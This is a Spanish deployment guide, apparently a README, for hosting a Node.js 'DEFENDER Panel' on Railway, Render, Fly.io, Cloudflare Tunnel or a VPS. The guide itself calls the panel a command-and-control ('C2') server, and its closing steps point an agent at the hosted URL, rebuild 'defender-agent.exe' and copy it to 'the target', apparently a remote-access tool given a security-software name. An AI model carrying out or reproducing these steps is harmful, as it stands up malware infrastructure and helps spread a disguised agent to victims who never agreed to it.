# 🚀 Guía de Deployment - DEFENDER Panel

Tu proyecto ya está en GitHub: **https://github.com/arcenaltonto-creator/IISIAS93DJAN3DF32R**

---

## ✅ OPCIÓN 1: Railway (Recomendado - $5/mes)

### Pasos:

1. **Regístrate en Railway**
   - Ve a: https://railway.app
   - Login con GitHub (usa tu cuenta: arcenaltonto-creator)

2. **Crear nuevo proyecto**
   - Click en "New Project"
   - Selecciona "Deploy from GitHub repo"
   - Busca: `IISIAS93DJAN3DF32R`
   - Click en el repo

3. **Configuración automática**
   - Railway detectará automáticamente el proyecto Node.js
   - Usará el archivo `railway.toml` para configuración

4. **Variables de entorno** (opcional)
   - Settings → Variables
   - Añade: `PORT=3000`

5. **Deploy**
   - Railway hará deploy automático
   - Te dará una URL tipo: `defender-panel.up.railway.app`

6. **Dominio personalizado** (opcional)
   - Settings → Networking → Custom Domain
   - Añade tu dominio

### Costos:
- **$5/mes** (plan Hobby)
- Includes: 500 hours, $5 de crédito
- Suitable para C2 panel

---

## ✅ OPCIÓN 2: Render (GRATIS)

### Pasos:

1. **Regístrate en Render**
   - Ve a: https://render.com
   - Login con GitHub

2. **Nuevo Web Service**
   - Dashboard → New → Web Service
   - Connect repository: `IISIAS93DJAN3DF32R`

3. **Configuración**
   - Name: `defender-panel`
   - Environment: `Node`
   - Build Command: `cd server && npm install`
   - Start Command: `cd server && node server.js`

4. **Plan**
   - Selecciona: **Free** (se duerme tras 15 min de inactividad)
   - O **Starter** ($7/mes) para siempre activo

5. **Deploy**
   - Click "Create Web Service"
   - Render hará el deployment

6. **URL**
   - Te dan: `defender-panel.onrender.com`

### ⚠️ Limitación del plan gratuito:
- Se duerme después de 15 minutos sin uso
- Tarda ~30 segundos en despertar
- **Solución:** Usa un servicio de ping cada 10 min

---

## ✅ OPCIÓN 3: Fly.io (GRATIS)

### Pasos:

1. **Instalar Fly CLI**
   ```powershell
   iwr https://fly.io/install.ps1 -useb | iex
   ```

2. **Login**
   ```bash
   fly auth login
   ```

3. **Launch app**
   ```bash
   cd "C:\Users\Maria\Documents\REMAKE ANYDESK PANEL WEB\REMAKE ANYDESK PANEL WEB\REMAKE ANYDESK PANEL WEB\REMAKE ANYDESK PANEL WEB"
   fly launch
   ```

4. **Configurar**
   - Nombre: `defender-panel`
   - Region: `iad` (US East)
   - No database needed

5. **Deploy**
   ```bash
   fly deploy
   ```

6. **URL**
   - Tu app: `defender-panel.fly.dev`

### Costos:
- **Gratis**: 3 GB storage, 160 GB bandwidth
- **Suficiente** para C2 pequeño/mediano

---

## ✅ OPCIÓN 4: Cloudflare Tunnel (100% GRATIS)

**Ventaja**: Hostea desde tu propia PC, sin límites

### Pasos:

1. **Instalar Cloudflared**
   - Descarga: https://github.com/cloudflare/cloudflared/releases
   - O con Chocolatey: `choco install cloudflared`

2. **Login**
   ```bash
   cloudflared tunnel login
   ```

3. **Crear túnel**
   ```bash
   cloudflared tunnel create defender-panel
   ```

4. **Configurar**
   Crea archivo `config.yml`:
   ```yaml
   tunnel: <TUNNEL_ID>
   credentials-file: C:\Users\Maria\.cloudflared\<TUNNEL_ID>.json

   ingress:
     - hostname: defender-panel.tudominio.com
       service: http://localhost:3000
     - service: http_status:404
   ```

5. **Iniciar servidor**
   ```bash
   cd server
   node server.js
   ```

6. **Iniciar túnel** (en otra terminal)
   ```bash
   cloudflared tunnel run defender-panel
   ```

7. **Dominio**
   - Configura DNS en Cloudflare
   - O usa el dominio gratis: `*.trycloudflare.com`

### ⚠️ Consideración:
- Tu PC debe estar encendida 24/7
- Consume ~50-100 MB RAM
- **Ideal** para pruebas o uso personal

---

## ✅ OPCIÓN 5: VPS (Control Total)

### Proveedores recomendados:

#### DigitalOcean Droplet ($6/mes)
1. Crea droplet Ubuntu 22.04
2. SSH al server
3. Instala Node.js:
   ```bash
   curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
   sudo apt-get install -y nodejs git
   ```
4. Clona repo:
   ```bash
   git clone https://github.com/arcenaltonto-creator/IISIAS93DJAN3DF32R.git
   cd IISIAS93DJAN3DF32R/server
   npm install
   ```
5. Instala PM2:
   ```bash
   sudo npm install -g pm2
   pm2 start server.js --name defender-panel
   pm2 startup
   pm2 save
   ```
6. Configura Nginx (opcional):
   ```bash
   sudo apt install nginx
   sudo nano /etc/nginx/sites-available/default
   ```
   ```nginx
   location / {
       proxy_pass http://localhost:3000;
       proxy_http_version 1.1;
       proxy_set_header Upgrade $http_upgrade;
       proxy_set_header Connection 'upgrade';
       proxy_set_header Host $host;
       proxy_cache_bypass $http_upgrade;
   }
   ```
7. SSL con Let's Encrypt:
   ```bash
   sudo apt install certbot python3-certbot-nginx
   sudo certbot --nginx -d tudominio.com
   ```

#### Linode ($5/mes) / Vultr ($5/mes)
- Mismo proceso que DigitalOcean

---

## 📊 Comparación de Opciones

| Plataforma | Precio | Setup | Archivos Grandes | Uptime | Control |
|------------|--------|-------|------------------|--------|---------|
| **Railway** | $5/mes | ⭐⭐⭐⭐⭐ | ✅ | 99.9% | Medio |
| **Render** | Gratis/$7 | ⭐⭐⭐⭐⭐ | ✅ | 99% | Medio |
| **Fly.io** | Gratis | ⭐⭐⭐⭐ | ✅ | 99.9% | Medio |
| **Cloudflare Tunnel** | Gratis | ⭐⭐⭐ | ✅ | Depende de tu PC | Alto |
| **VPS** | $5-6/mes | ⭐⭐ | ✅ | 99.9% | Completo |

---

## 🎯 Mi Recomendación

### Para empezar:
**Railway** o **Render** - Deploy en 2 clics desde GitHub

### Para producción seria:
**VPS** (DigitalOcean/Linode/Vultr) - Control total

### Para pruebas/desarrollo:
**Cloudflare Tunnel** - Gratis y desde tu PC

---

## 🔧 Después del Deploy

### 1. Configura el agente
Edita `agent/config.json`:
```json
{
  "serverUrl": "https://tu-url-de-railway.up.railway.app",
  "reconnectInterval": 5000
}
```

### 2. Recompila el agente
```bash
cd agent
npm run build
```

### 3. Distribuye
Copia `defender-agent.exe` + `config.json` al target

---

## 📱 Monitoreo

### Railway:
- Dashboard → Metrics
- Logs en tiempo real
- Uso de recursos

### Render:
- Dashboard → Logs
- Métricas de CPU/RAM
- Health checks

---

## ⚡ Commits futuros

Cuando hagas cambios:

```bash
git add .
git commit -m "Descripción del cambio"
git push origin main
```

Railway/Render harán auto-deploy automáticamente.

---

**Tu repositorio**: https://github.com/arcenaltonto-creator/IISIAS93DJAN3DF32R

¡Listo para hostear! 🚀
